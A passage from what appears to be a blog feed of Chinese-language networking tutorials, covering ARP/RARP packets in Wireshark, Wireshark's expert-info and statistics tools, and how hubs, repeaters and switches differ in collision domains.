aria-hidden="true">Packets</figcaption></figure><p>报文列表的 <code>Info</code> 字段，对应的内容是：</p><blockquote><p>Who has 10.0.0.254? Tell 10.0.0.6</p><p>10.0.0.254 is at 00：00：39：cf：d9：cd</p></blockquote><p>这是 wireshark 帮我们解析 ARP报文，并用英语表达出来。这句话生动地概括了 ARP请求的意思：<strong>谁知道 10.0.0.254 的物理地址？告诉10.0.0.6</strong>. ARP 响应的意思：<strong>10.0.0.254 的物理地址是00：00：39：cf：d9：cd</strong>.</p><p>第一个包（请求包）：</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/arp_request.png"alt="First" /><figcaption aria-hidden="true">First</figcaption></figure><ol type="1"><li>数据帧大小 42 字节，全部被捕获</li><li>以太网源地址为本地 MAC 地址，目的地址为 全 1 的广播地址，类型为ARP</li><li>此报文为 ARP request，物理网络类型：以太网，请求 IP: 10.0.0.254 的MAC 地址</li></ol><p>第二个包（响应包）：</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E8%BF%9B%E9%98%B6/arp_reply%20.png"alt="Second" /><figcaption aria-hidden="true">Second</figcaption></figure><ol type="1"><li>数据帧大小 60 字节，全部被捕获</li><li>以太网目的地址为本机地址，源地址即为所查询 IP 的主机的 MAC 地址</li><li>此报文为 ARP 响应报文，物理网络类型：以太网，目的 IP 及 MAC均对应我的主机，源 IP 为我主机请求 IP，源 MAC 即为 该 IP 对应 MAC地址。</li></ol><h2 id="cache-validation-报文">cache validation 报文</h2><p>抓包的时候还看到了有一对 ARP 报文，它们是从机器 B 发来查询机器 A MAC地址的。但 ARP 请求报文以太网帧的目的地址不是广播，而是机器 A 的 MAC地址，原因是为了<strong>验证缓存的有效性</strong>！具体可查看下面的参考链接，</p><h2 id="gratuitous-arp">Gratuitous ARP</h2><p>除了标准的 ARP 之外，还有一种特殊的 ARP 报文，称为 GratuitousARP（免费 ARP）。这个报文也是广播报文，它的特殊性在于，它的报文中发送端IP 地址和接收端 IP 地址都被设置为发送该报文的主机IP。为什么要有这样一个特殊的报文呢？因为它有用，比如：</p><ul><li>检测 IP 冲突。如果免费 ARP请求接收到应答，说明当前网络上有另外一个和发送机器有相同 IP 的主机</li><li>可以用来更新网络中当前机器的 ARP 缓存。如果机器重新配置了 IP地址，那么免费 ARP 报文能够把新的 IP-MAC匹配关系广播到网络中，接收到报文的机器更新自己的 ARP缓存记录，这样就不会有因为 ARP 缓存失效导致的网络问题</li></ul><p>如果机器 A 重新配置了 IP 地址，那么 MAC 与 IP的对应关系就发生了变化，网络中保存的旧 ARP表项都失效，无法继续使用，会导致 ping 错误。Linux 系统中可以使用<code>arping</code> 命令行来发送 GratuitousARP，让网络中所有主机更新当前机器的 ARP 记录。</p><h2 id="rarp">RARP</h2><p>在抓包测试 ARP 协议时，抓到了 RARP的包，于是经过一番查阅后，简要介绍一一下 RARP协议（首先你要知道，它已经过时了）。</p><p>RARP（Reverse Address ResolutionProtocol）是一个<strong>过时</strong>的被局域网中的客户机用来向网关路由器的ARP 表请求自己的 IPv4 地址的网络协议。网络管理员在网关路由器上创建了 ARP表，用来映射 MAC 地址与 IP 地址。</p><p>当一台新的机器被创建或任何没有内存存储自己的 IP 地址的机器需要一个 IP地址供自己使用时，这台机器（称其为 A）发送 RARP广播包，其中发送方和接收方的 MAC 都是它自己的 MAC 地址。</p><p>在局域网中，有一台主机被单独配置为 RARP服务器，它负责回应这种广播包。RARP 服务器收到广播包之后，在 ARP表中查找，如果有匹配的表项，则将 IP 地址放在返回包中，返回给 A。</p><p>RARP 在如今的网络中已经不被使用，因为有更加高效的协议比如：BOOTP（Boostrap Protocol） 和 DHCP。 RARP 可以满足主机 IP地址配置的部分要求，但是不能完全满足包括但不限于以下配置：网络掩码，网关地址，静态路由，DNS服务器，以及私有的，公有的 option 功能。 RARP是二层协议，无法穿透子网，DHCP 可以穿透子网。</p><h1 id="参考资料">参考资料</h1><blockquote><ul><li><a href="https://cizixs.com/2017/07/31/arp-protocol/">ARP协议解析</a>（极力推荐）</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二. Wireshark的基本功能</title>
      <link href="/blog/2019/07/07/wireshark/basic_funciton/"/>
      <url>/blog/2019/07/07/wireshark/basic_funciton/</url>
      
        <content type="html"><![CDATA[<h2 id="协议解析">协议解析</h2><p>Wireshark最强大的功能之一就是协议解析功能，协议解析是由协议解析器完成。它将原始数据包拆分为相关数据段，并按照协议格式解析为</p><p>它是原始数据流与协议的翻译器。如果遇到新的协议可以用 C 语言或 Python编写解析程序。注意： Wireshark进行协议解析时，并不见得每次都会选择正确的协议解析器，尤其是当网络上的一个协议使用了不同于标准的配置的时候，一旦遇到这种情况，我们就需要手动更改。比如：FTP协议原本应该使用 20，21 端口，却使用了 HTTPS 的 443端口，这样可能将其解析为 HTTPS 协议，此时，可以通过查看 SSL数据包中的数据字节区的 ASCII码部分是否有相关有意义的明文出现，根据其中显示的 FileZilla Server等明文，判断为 FTP协议。此时，可以在需要转化类型的数据报上右键-&gt;解码为选择合适的协议解码，注意：这样的设置只在本次软件使用时有效，下次启动时就恢复至原状态了。</p><p>Wireshark是开源软件，可以通过下载查看其源代码来查看其解析错误的原因。</p><h2 id="数据流追踪">数据流追踪</h2><p>TCP 数据报可以说是是我们日常分析中最常见的了，因此 Wireshark为了方便我们分析，提供了将 TCP数据报重组为易于阅读的形式。我们可以在一个 TCP数据包上右键选择追踪流-&gt; TCP 流，Wireshark便将与之相关的数据包重组，弹窗显示出 HTTP 报文。</p><h2 id="专家信息">专家信息</h2><p>菜单栏 -&gt; 分析 -&gt; 专家信息</p><p>是内置于 Wireshark软件中最强大的工具之一，不但能在抓包过程中自动识别网络中发生的异常，甚至还能给出导致异常状况的原因，Wireshark 会把识别出来的事件按出故障概率的高低，通过 Expert Info工具以事件类别的方式加以显示，同时还使用了颜色来加以区分。</p><p>信息类别：</p><ol type="1"><li><p>Errors：所抓数据识别出的严重错误，比如，感知到畸形（标准化配置不对）SPOOLSS或 GTP协议数据包，又或者识别到某些数据包的某种协议头部的某些字段值跟预期不符（比如，IPv4数据包的 IP 包头中校验和字段值跟预期值不符合，即 IPv4数据包通不过校验和检查）</p><p>注意：川出现一两个畸形包时没问题，因为 Wireshark 的识别器也不是100%准确的。</p></li><li><p>Warnings：所抓数据识别出的一般性问题</p></li><li><p>Notes：所抓数据识别出的可能会引发故障的异常现象</p></li><li><p>Chats：此标签下的数据包都符合常规流量特征</p></li><li><p>Details：此标签显示 Chats 标签事件的详情</p></li><li><p>Packet Comments：把含有注释信息的数据包一一记录在案</p></li></ol><p>可以通过专家信息对当前网络的稳定性或稳健性有一个了解。</p><p>errors，warnings，notes这三个是最重要的，通过双击某个数据报，可以在数据列表区显示，也可以右键应用为过滤器，过滤查看。</p><p>认识 Errors 事件： Wireshark 感知到的子类 Error事件，主要分为以下两种情况</p><ol type="1"><li><p>校验和出错：既可能是 Ethernet 帧或者 IP数据包真的通不过检验和检查所致，也可能是 checksum offload参数方面的配置问题</p><p>数据流动方向：网卡（接收）&lt; - &gt; CPU (处理) &lt; - &gt;Wireshark，为了减轻 CPU的负担，校验和现在是放在网卡上做。网卡首先对到达自己的包，检验二层（链路层）的校验和，如果此校验和不对，直接丢弃，若正确，接收，再然后校验三层的校验和。所以一般情况下，Wireshark抓不到校验和错误的问题，只有一种情况它会抓到：自己产生的数据包（因为自己产生的数据报被CPU 处理时，校验和是空的，校验和由网卡负责，而 Wireshark 就是抓的 CPU位置的数据包）</p><p>校验和出错：某些操作系统支持 checksumoffload（校验和计算下放）功能。为了节省 CPU 资源，操作系统把IP、TCP、UDP 校验和计算功能下放给 NIC（网卡，network interfacecontroller，也叫网络接口控制器，也叫网络适配器），数据包在出 NIC的时候执行校验和计算。但是 Wireshark 会在数据到达 NIC之前抓取数据包，此时 IP、TCP、UDP 校验和字段值并没有，于是会看到Wireshark 感知到很多校验和有误之类的 Error事件。而且这些校验和错误的数据包的源 IP 地址为本机 IP 地址。这样的 Error事件可以忽略不考虑。也可以关闭 Wireshark IP、TCP 的校验和检查功能。Wireshark 3.0.2默认是关闭的(新版估计都默认关闭了，不确定的话，再按照下面操作一遍)</p><p>操作方式：编辑（edit） -&gt; 首选项（preference） -&gt;协议（protocol）-&gt; Ipv4 -&gt; 取消勾选 Validate the IPv4 checksum ifpossible。然后再对 TCP 也取消勾选那个。</p></li><li><p>伪造的数据包问题：一般是具体的应用层协议问题，也有可能是Wireshark 的协议解析问题</p></li></ol><p>认识 Errors 事件：总结</p><p>对于一个网络而言，穿梭于其中的数据包只要有百分之一、二的害群之马（即具备Error 事件特征的数据包），不但会导致事故频发（比如 TCP重传），而且会使网络变得很慢，因此只要网络用起来大致正常，Wireshark是不可能抓到那么多真的害群之马的。</p><p>Warnings：所抓数据识别出的一般性问题。比如，感知到了存在 TCP 零窗口、TCP window full、TCP 报文段失序、TCP 报文段丢失等现象，又或者识别出了相关网络协议在运作时发出的数据包的内容与正常情况不一致。所谓一般性问题几乎都是应用程序问题或通信问题。</p><p>认识 Warnings 事件： Wireshark 感知到的子类 Error事件，主要分为以下三种情况</p><ol type="1"><li>含 Reassembly 字样的几种子事件：大多是指 Wireshark 抓到了未能重组的数据包。一般而言，这都是 Wireshark 协议解析器问题。</li><li>在 Summary 一栏里含 window 字样的子事件：几乎都是指 Wireshark感知到了网络中存在 TCP zero windown 或 window full问题，一般而言都是建立 TCP 连接的端到端设备忙不过来所致。</li><li>在 Summary 一栏里含 Segment 字样的子事件：Wireshark 生成 TCP 报文段丢失事件信息，是因其未抓全隶属于某股 TCP 数据流的所有 TCP 报文段：生成TCP 报文段失序事件信息，是因其感知到了 TCP 报文段未按发送主机发出的顺序到达接受主机 这三种子事件都属于 TCP故障，一般是由网络故障所引发</li></ol><p>认识 Warnings 事件：总结</p><p>Wireshark 能感知数据包中的种种特征，比如窗口大小字段、TCP报文在传输中是否失序、TCP 数据收到之后是否做出确认。但是请注意，Warnings事件只是 Wireshark 自认为比较重要的事件，却也不可全信，比如说 Wireshark未能抓取所有数据包，则必会生成 Warnings事件，但这未必就是网络问题，可能只是抓包时机把握。</p><p>Notes：所抓数据识别出的可能会发故障的异常现象。比如，感知到了 TCP重传。重复确认、以及快速重传等现象。虽然上述行为可能会对网络产生严重影响，但也属于TCP 的正常行为，所以被归类在Notes，提醒用户这些数据有导致问题的嫌疑。</p><p>认识 Notes 事件： Wireshark 感知到的子类 Error事件，主要分为以下三种情况</p><ol type="1"><li>Summary-栏里含 Retransmissioyls、Fast Retrarmsmissions、DuplifateACK字样的子事件：通常预示着网速慢）丢包或者通过 TCP传输数据的主机的应用程序忙不过来。</li><li>在 Summary 一栏里含 Keep-Alive 字样的子事件：通常预示着 TCP 或者基于 TCP 的应用程序的问题。</li><li>在 Summary 一栏里含 Time to live字样的子事件：通常预示看路由问题</li></ol><p>认识 Notes 事件：总结 Notes事件的每一种子事件，并非是由定的募一种类型的网络故障所导致的，以 TCP重传现象为例，可能是因为包错误）网络状态差（带宽低、延时高）、服务器或客户端停止响应等。Wireshark只是通过 Expert Info 工具提示存在 TCP重传现象，至于如何定位原因找到问题，还得靠自己。</p><p>Chats，可以统计各种数据包的个数，尤其是 TCP 的 SYN 的个数，可以判断是否正在受到 SYN flood 的攻击。</p><p>总结：</p><ol type="1"><li>有时 Wireshark 感知的 Warnings 事件无关紧要，但是识别出的 Notes事件却偏偏会影响网络性能，所以排除故障时，需要关注内在，切勿只看表面</li><li>Wireshark 摆乌龙的情况时有发生，既可能是杯弓蛇影、谎报军情误报故障；也有可能会一叶障目感知不到网络的异常状况。</li><li>所以 Wireshark 虽然智能，但也不过是个工具而已，解决网络故障靠的还是网管人员的知识储备。</li></ol><h2 id="统计">统计</h2><h3 id="捕获文件属性统计摘要说明">捕获文件属性(统计摘要说明)</h3><p>菜单栏 -&gt; 统计 -&gt; 捕获文件属性</p><p>对抓获的数据报进行全局统计</p><p>抓取数据包的文件名，长度，时间，抓包接口，还有一些抓包速度，大小，比例等统计信息。</p><h3 id="协议分级">协议分级</h3><p>菜单栏 -&gt; 统计 -&gt; 协议分层</p><p>统计通信流量中不同协议占同一层次的百分比。通过这个工具的百分比可以对全网流量有直观的了解，整个网络中哪些流量占用多，哪些流量占用少。可以通过百分比查看网络异常，比如:ARP 流量一般是 0.0 几% 或 0.几% ，如果你看到网络中 ARP 流量为 10%或20%，那么网络中大概率有 ARP 泛洪 攻击</p><p>使用 UDP 的一般有 DNS、OICQ，使用 TCP 的一般有 HTTP、SSL、Data</p><p>各字段讲解：</p><ol type="1"><li>协议：数据包所归属的协议名称</li><li>按分组百分比：抓包文件所含数据包个数在每一种协议类型中的占比（同一层）</li><li>分组：每种协议类型数据包个数</li><li>按字节百分比：抓包文件所含数据包字节数在每种协议类型中的占比（同一层）</li><li>字节：每种协议类型数据包字节数</li><li>比特每秒：某种协议类型的数据包在抓包时段内的传输速率</li><li>结束分组：隶属于该协议类型的数据包的<strong>纯粹数量</strong>。（举例：比如当TCP 协议的 Packets 和 End Packets 数量分别是 13716 和9425，这就表示抓取的数据中，以 TCP 封装数据总数是 13716 个，但只有 9425个纯 TCP 数据包，也就是还有 4291 个数据包在 TCP头部之后还紧跟了高层应用协议头部，比如 HTTP 头部）</li><li>结束 字节；隶属于该协议类型的数据包的纯粹字节数</li><li>结束 位每秒：隶属于该协议类型的数据包在抓包时段内纯粹传输速率</li></ol><p>比如： 前后 1000 100，即： 后面比前面少得离谱 这种情况下，900多个在传数据的包，很大程度上是基于 TCP 的攻击</p><h3 id="端点与会话">端点与会话</h3><p>端点是结点与结点之间，会话是一对一的，可以通过他们来找出发送流量，占用带宽大的或有异常行为的。</p><h4 id="端点">端点</h4><p>罗列出所有二层、三层、四层节点数据统计信息，还可以从高到低排列，通过这些统计信息，可以很好解释一下现象：</p><ol type="1"><li>MAC 地址少，IP端点多：这种现象可能的原因是有一台路由器来负责转发所有进出本地 LAN 的 IP流量，也就是说所有流量都是由某一个 IP地址为网关做集中转发的。这属于正常现象。</li><li>IP 地址少，TCP 端点（TCP 端口号）多：即 每个 lP都试图建立或已经建立多条 TCP 连接。对于此现象，如果建立多条连接的 IP端点是服务器，就属于正常现象，否则极有可能就是有人在发动网络攻击，比如TCP SYN 攻击。</li></ol><h4 id="会话">会话</h4><ol type="1"><li>窗口左下角显示过滤器的限制复选框：该窗口将会显示经过显示过滤器过滤的信息</li><li>窗口左下角 解析名称复选框：用相应的名字取代窗口显示的信息</li><li>Ethernet：观察具有不同 MAC地址的主机之间发生过什么样的交流。通过此标签，可以观察是否出现了二层广播风暴，或者伪造MAC 地址欺骗攻击等问题、</li><li>IPv4/IPv6：观察具有不同 IP地址主机之间有过什么样的沟通。通过此标签，可以观察极高曝光率的 IP地址，判断流量的异常，判断是否有黑客工具在扫描网络，或者判断由于感染上蠕虫病毒持续发送巨量Ping 包的主机。</li><li>TCP/UDP：观察具有不同 IP 地址的主机之间建立的各种 TCP/UDP会话。通过此标签，可以观察是否有某一台主机打开过多的 TCP/UDP连接，对于单台而言打开 10-20个连接应该是正常范畴，若连接过百，就可能有问题。或者判断是否有主机试图与稀奇古怪的TCP/UDP 目的端口号建立连接，也就是所谓的 TCP/UDP 端口扫描。</li></ol><h3 id="分组长度">分组长度</h3><p>选择统计-&gt; 分组长度</p><p>统计数据流量中包长度的分布，通过数据报长度的分布情况，对网络情况做一个大概的分析。</p><p>正常包的话，大部分为 40-2559，小型帧（小于 40）或巨型侦（大于2559）攻击，当小于 40 或者大于 2559 的比例占到 5%或10%时，有可能存在这种攻击。</p><p>可以通过显示过滤器输入协议类型，比如： arp， tcp等，查看各类型协议的长度大概都是多大。</p><p>40-319：大部分都是小型帧，比如：</p><p>arp：一般是 40 或 50 多，为小型帧</p><p>icmp：ping 包一般 70 多到 90 多，别的可能到 100 多 200 多左右</p><p>dns：79 到 227 左右</p><p>tcp 的控制信息：50，60，70 等</p><p>320-2559：大型帧，一般为 tcp 碎片包一般 800，900，1000 多</p><p>TCP 和 IP 头部均为 20 字节，UDP 头部 8 字节，以太网帧 MTU 1500字节，除去 TCP，IP 头部，还剩下 1460 个字节。</p><p>重点关注 1280-2559长度的数据包，像这种较大的数据包，一般是用于数据传输，比如：http下载，ftp上传等，如果这种类型的数据包比较多，说明我们可能在看视频，浏览网页比较多，较小的数据包用传输控制信息。</p><h3 id="图表分析">图表分析</h3><h4 id="io-图表">IO 图表</h4><p>菜单 -&gt; 统计 -&gt; IO 图表</p><p>IO 图是 Wireshark最高效也最强大的工具之一，它对网络中的吞吐流量进行实时的图形显示，用来分析网络性能</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/iograph.png" /></p><p>界面：</p><p>上半部分是图形显示区域，下边是配置区域。</p><p>下方列表是可供显示的 IO 图，可以看到有 8 列</p><ol type="1"><li>Enabled ：显示此图与否</li><li>Graph Name ：图表名，双击鼠标左键，可以自定义</li><li>Display Filter：显示过滤器，用来输入过滤语句，双击鼠标左键，可以自定义语句</li><li>Color：图的颜色，双击鼠标左键，可以自定义</li><li>Style：图表的类型，有 bar，dot，line等，双击鼠标左键，可以自定义</li><li>Y Axis：Y 轴的单位，双击鼠标左键，可以自定义 字节，比特MAX（）：每个计时单位内，所传输数据包中相关参数的最高值MIN（）：每个计时单位内，所传输数据包中相关参数的最低值AVG（）：每个计时单位内，所传输数据包中相关参数的平均值SUM（）：右边输入适当条件（如：ip.len），单位时间内，参数总和 COUNTFRAMES（）：统计在每个计时单位内，发生的匹配该条件的现象 COUNTFIELDS（）：每个计时单位内，所传输数据包中该字段出现的次数</li><li>后面两类还没动过... 左下角加减号可以自己增加或减少图，间隔是用来控制x 的单位的，一天时钟复选框勾选，以一天当中具体时间来显示 x轴，可以选择鼠标拖拽或缩放图表。</li></ol><p>举例： 通过 IO Graphs 图形来反映对 xx Web 页面的访问量：显示在不同时间内，访问 baidu 站点的次数。显示过滤器表达式为 http.hostcontains "xx"</p><p>测算端到端之间的吞吐量（主机 172.16.89.101 和 172.16.89.100 间的 IP流量图）： 显示过滤器语句 ip.addr eq 172.16.89.101 and ip.addr eq172.16.89.100</p><p>添加更多的条件来观察数据流在传输过程中发生的变故： tcp.stream eq 16and tcp.analysis.retransmission，反映某股数据流重传现象 tcp.stream eq 16and tcp.analysis.zero_ window，反映某股数据流中的 TCP 零窗口现象（tcp.stream eq 8 表示流编号等于 8 的，即：trace 中第 8 个 TCP 流）注释： TCP 重传：TCP重传现象预示着发生了丢包，说明网络卡或者其他与网络性能有关的问题。 TCP零窗口：TCP 零窗口现象意味着 TCP 接收方或者发送方反映迟钝。</p><p>获悉某股 TCP 数据流中数据包的抖动情况</p><p>选中其中一个 TCP 包，右键-&gt; 对话过滤器-&gt;TCP，然后复制语句，打开 IO 图表，再写上 frame.time_delta_displayed就可以了</p><h4 id="数据流图">数据流图</h4><p>菜单 -&gt; 统计 -&gt; 流量图</p><p>将会话通信过程图形可视化出来，可以通过显示过滤器过滤想要查看的，再查看。</p><ol type="1"><li>All packets：所有数据包</li><li>Displayed packets：经过过滤器过滤</li><li>流类型：Allflow：所有数据或者经过过滤器的数据包生成总体数据流图、tcpflow：所有或者进过过滤器的包生成 TCP 标记、序列号、ACK号以及报文段长度的 TCP 数据流图、UDP Flow 等</li><li>左下角 限制显示过滤器 复选框（暂时还不知道咋用）。</li></ol><h2 id="http">HTTP</h2><ol type="1"><li><p>分组计数器 Packet Counter：了解抓包文件中 HTTP数据包的总数以及其中 HTTP 各类型请求数据包（post、get 等）和 HTTP响应数据包（从 1xx 开始的响应状态码）数量及比率分别为多少。</p></li><li><p>请求序列 Request Sequences：主机请求访问的 Web站点的分布情况，以及所访问的 Web 站点上的具体资源，指向资源的URL</p></li><li><p>负载分配 Load Distribution：了解访问过哪些 Web 站点。</p><p>注：可下载专业排除 HTTP 故障的软件 Fiddler</p></li></ol><h2 id="tcp-流图形tcp-graph">TCP 流图形（TCP Graph）</h2><p>TCP Stream Graph 菜单中 Time-Sequence（Stevens）子菜单用法：</p><ol type="1"><li>该工具不能在线实时生成统计信息，使用之前先停止抓包</li><li>具有方向性，需要选中一个隶属于需要分析的 TCP数据流的数据包再生成图表，比如，要让此工具生成与 HTTP下载流量有关的统计信息，就应该选择下行流量的数据包，即源 P是公网，端口是 80，目标 IP 是私网，端口是随机的数据包。</li><li>Stenvens 子菜单所生成的图形实际上反映的是，在单位时间内，受监控的TCP流在某个方向所传输数据的字节数。根据此可以判断某应用的下载或者上传速度。</li><li>需要放大图表中的某个区域，只需要用鼠标圈定该点所在的区域，缩小按减号</li><li>鼠标左键图表中的点，便可在主窗口中的数据包列表区域定位到与其对应的数据包</li><li>可在弹出的窗口调整相关的显示参数。</li></ol><p>TCP Stream Graph 菜单中 Time-Sequence（tcp-trace）子菜单用法：</p><ol type="1"><li>tcp-trace 子菜单功能起源于 UNIX tcp dump 工具</li><li>可提供被监控 TCP 连接的诸多信息，包括 TCP 确认、TCP 重传、以及 TCP窗口大小等。</li><li>也需要先停止抓，再分析数据，生成图表</li><li>此菜单反映的信息星及其丰富，可为网络排障诊断提供重要线索</li><li>可直观反映出诸多现象，比如，TCP 窗口的填充速度高于预期的大规模 TCP重传等现象</li></ol><p>一条曲线：表示单位时间内，受监控的 TCP，在某个方向上所传数据的字节数另一条表示曲线：表示整个数据传输过程中 TCP 报文段的 TCP 接受窗口</p><p>吞吐量：不但能了解某条 TCP 连接的吞吐量，而且还能判断 TCP连接是否稳定。</p><p>往返时间：能了解到某条 TCP 连接中特定方向上的所有 TCP报文段的往返时间（RTT）。</p><p>窗口尺寸：能了解通过 TCP 连接传送数据时，发送方的窗口大小。</p><h2 id="ipv4-statistics">IPv4 Statistics</h2><ol type="1"><li>All Address：生成有关 IP 地址的统计</li><li>Destinations and Ports：生成 IP地址在发包时所用的传输层协议以及端口号</li><li>IP protocol Types：生成抓取数据中 IP 上层的协议统计。</li><li>Source and Destination Addresses：生成源和目标 IP地址统计信息。</li></ol><h2 id="命令行模式">命令行模式</h2><p>使用命令行分析的优势</p><p>利用命令行对捕获文件进行调优分析</p><p>掌握命令行工具的常用命令</p><p>掌握命令行行工具与第三方辅助工具的使用方法</p><p>找到 Wireshark 的安装目录，下面有 tshark.exe 及其帮助文档tshark.html，复杂网络情况，手工比较困难，可以使用编写脚本，这是就需要使用命令行工具了。</p><p>要使用 tshark 等工具，需要切换至对应目录或将目录加入环境变量</p><p>命令行可以在 linux 中使用 grep、awk 等高效处理工具</p><p>如果需要对捕获文件的概述信息进行查看，可以使用 capinfos.exe</p><p>一般抓包之后，先看看捕获文件属性（summary），再看协议分级，掌握一下当前网络的大体情况，然后再干别的。</p><p>大体完了，细节处，在以后实战的时候，见到再完善。</p><p>参考资料：</p><blockquote><ul><li><ahref="https://www.cnblogs.com/li-hao/archive/2011/12/07/2279912.html">IP头，TCP 头，UDP 头，MAC 帧头定义</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> wireshark </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wireshark功能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络设备与两种冲突域</title>
      <link href="/blog/2019/07/01/network/device_conflicting_domain/"/>
      <url>/blog/2019/07/01/network/device_conflicting_domain/</url>
      
        <content type="html"><![CDATA[<p>首先看一下 <ahref="https://baike.baidu.com/item/OSI%E6%A8%A1%E5%9E%8B">OSI</a>七层工作模型</p><p><img src="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/wireshark/%E5%85%A5%E9%97%A8/OSI.png" width="60%" height="50%" /></p><h2 id="集线器">集线器</h2><p>首先，“识时务者为俊杰”，要知道集线器是当初技术不发达的时候开发出来的。随着交换机价格的降低，集线器大部分被淘汰。因为集线器（hub）是把将所有信号广播出去容易造成网络拥塞，而交换机能够处理2 层的包，使用通过识别 MAC地址来进行有选择的转发，既安全又不容易造成拥塞，所以交换机几乎取代了集线器。嗯，接着讲。</p><h3 id="原理">原理</h3><p>集线器是指将多条以太网双绞线或光纤集合连接在同一段物理介质下的设备（只对信号进行整型、放大后再重发，不进行编码，因此处于物理层）。其内部是总线型拓扑，各节点（端点）共用一条总线进行通信（其数据流在同一时间内必须维持单向才能保证数据不混淆，这也就决定了它只能工作在<a href="#half">半双工模式</a>下）。</p><p>集线器本身不能识别 MAC 地址和 IP地址，当集线器下连接的主机设备间传输数据时，数据包是以广播的方式进行传输，即：集线器将输入端口的信号广播给以太网内其他所有的端口，所有其他端口都会接收信号并且判断其中的Mac 报头中的接收方 Mac 地址是不是为自己的 Mac地址，如果不是就抛弃，如果是就接收回应。</p><h3 id="特性">特性</h3><h4 id="共享带宽">共享带宽</h4><p>集线器是一种“共享”设备，集线器本身不能识别目的地址，当同一局域网内的A 主机给 B主机传输数据时，数据包在以集线器为架构的网络上是以广播方式传输的，由每一台终端通过验证数据包头的地址信息来确定是否接收。</p><h4 id="半双工模式"><a name="half">半双工模式</a></h4><p>全双工是指两台设备在发送和接收数据时，通信双方都能在同一时刻进行发送或接收操作，这样的传送方式就是全双工。而处于半双工传送方式的设备，当其中一台设备在发送数据时，另一台只能接收，而不能同时将自己的数据发送出去，即：只能发送或者接收信号。</p><p>由于集线器采取的是“广播”传输信息的方式，因此集线器传送数据时只能工作在半双工状态下。</p><h3 id="冲突域">冲突域</h3><p>集线器同一时间只能转发一种信号，换一种说法，就是同一时刻由集线器连接的网络中只能传输一组数据，如果发生冲突则需要重传。集线器下连接的所有端口共享整个带宽，即所有端口都有可能会冲突。因此，称可能发生冲突的端口组成的网络为一个冲突域。</p><blockquote><p>百度百科：在以太网中，如果某个 CSMA/CD网络上的两台计算机在同时通信时会发生冲突，那么这个 CSMA/CD网络就是一个冲突域（collisiondomain)。如果以太网中各个网段以集线器连接，因为不能避免冲突，所以它们仍然是一个冲突域。</p></blockquote><h2 id="中继器">中继器</h2><p>我们知道随着经过的线缆越来越长，信号就会变得越来越弱，而中继器的目的便是在比特级别对网络信号进行再生和重定时，从而使得它们能够在网络上传输更长的距离。而集线器的特性与中继器很相似，因此被称为多端口中继器。二者的区别在于连接设备的线缆的数量。一个中继器通常只有两个端口，而一个集线器通常有4 至 20 个或更多的端口。</p><h2 id="二层交换机">二层交换机</h2><p>二层交换机属数据链路层设备，它在接收端口接收到信号，通过内部存储的Mac地址表查询接收方的端口号，查到之后让交换电路传输信号到指定的端口，如果在Mac地址表中查不到怎么办？那么交换机就会将信号转发到除了源端口之外的其他所有端口上，此时就类似于集线器的工作原理，这也是交换器比集线器高效的一点。</p><h3 id="原理-1">原理</h3><p>交换机是链路层设备，其基本工作原理：</p><ol type="1"><li><p>学习，根据收到的数据帧中的源 MAC地址建立该地址同交换机端口的映射，写入 MAC 地址表（MAC地址表记录了网络中所有 MAC 地址与该交换机各端口的对应关系）</p></li><li><p>直接转发，如果数据帧中的目的 MAC 地址在建立好的 MAC地址表中，交换机便根据根据该地址在表中对应的端口进行转发。</p></li><li><p>泛洪（flood），如果数据帧中的目的 MAC 地址不在 MAC地址表中，则向所有端口转发（除这个数据帧的入口），等到相应的主机单播回复之后，交换机记下回应数据帧的源MAC 地址与对应接口，以方便下次转发。（通过 ARP 协议）</p><p>注：ARP（全称 Address ResolutionProtocol)，网络层的协议，根据目的主机的 IP 地址，获得其 MAC地址。</p></li><li><p>更新，交换机内部的 MAC 地址表只有 300S的存在时间，定时五分钟会更新一次</p></li></ol><h3 id="特性-1">特性</h3><h4 id="独占带宽">独占带宽</h4><p>交换机能同时连通许多对的端口，并在大多数情况下，根据 MAC地址表进行一对一精准的转发，这样其他端口就不会被知道他们正在转发数据。</p><p>这里与集线器比较一下比较好理解。</p><p>一个 8 口 hub，当端口 1 上的机器 A 要给端口 8 上的机器 B 发数据时</p><p>在集线器上数据是这样跑的：</p><ol type="1"><li>首先 A 在端口 1 上侦听 hub 上有没有数据在传输，如果没有，端口 1就跳出来向 hub 上喊：“我有数据包要给端口 8，请端口 8 听到后回话”</li><li>然后这个数据被以广播的方式发送到 hub 上的其余 7个口上，每端口都会接到这样的数据包，然后端口 2 ~ 7 会发一则消息给端口1：“我不是端口 8，请你释放带宽资源”</li><li>与此同时端口 8 会发消息给端口 1：“我是端口 8，你在找我吗？”端口 1收到上述消息后，会和端口 8进行确认，然后他们建立传输链接，完成数据转发。</li><li>如果端口 1 在发送寻找端口 8的消息后，没有得到相应，那她还会接着广播这个消息，直到收到端口 8的回答。等端口 1 和端口 8 完成数据转发后，假设他们还要进行通讯，那么 hub上还会重复以上的过程。</li></ol><p>而交换机则是这样：</p><ul><li><p>如果 MAC 表上有目的 MAC（即：机器 B） 对应 MAC表项，那么交换机直接查表，然后只转发到端口 8</p></li><li><p>如果 MAC表上没有对应表项，则向所有端口（除了帧的进入端口）广播。更进一步，如果目标和源在同一端口，那么交换机则不做任何事，简单的丢掉这个帧而已。</p></li></ul><p>所以我们可以看到，交换机的工作方式，很好地隔离了冲突域，同一端口的设备之间的通信干扰不到另一端口的设备之间的通信，因为它无法穿透交换机。一般情况下，每一对相互通信的主机都能像独占通信媒体那样，进行无冲突地传输数据。此外，交换机是通过自学习学习到端口和物理地址的映射的，并且 ARP协议使用的就是广播，所以交换机绝对不能屏蔽广播。</p><h4 